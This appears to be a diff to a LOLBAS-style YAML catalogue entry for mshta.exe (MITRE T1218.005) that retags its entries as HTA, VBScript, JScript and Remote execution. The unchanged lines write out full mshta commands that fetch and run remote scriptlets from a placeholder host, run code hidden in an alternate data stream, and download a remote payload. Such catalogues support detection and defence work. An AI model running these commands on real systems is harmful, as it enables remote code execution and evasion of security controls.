@@ -12,7 +12,8 @@ Commands:
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: WSH
+      - Execute: HTA
+      - Execute: Remote
   - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
@@ -20,6 +21,8 @@ Commands:
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: VBScript
   - Command: mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
     Usecase: Execute code
@@ -27,6 +30,8 @@ Commands:
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: mshta.exe "C:\ads\file.txt:file.hta"
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code hidden in alternate data stream
@@ -35,7 +40,7 @@ Commands:
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
     Tags:
-      - Execute: WSH
+      - Execute: HTA
   - Command: mshta.exe https://example.com/payload
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
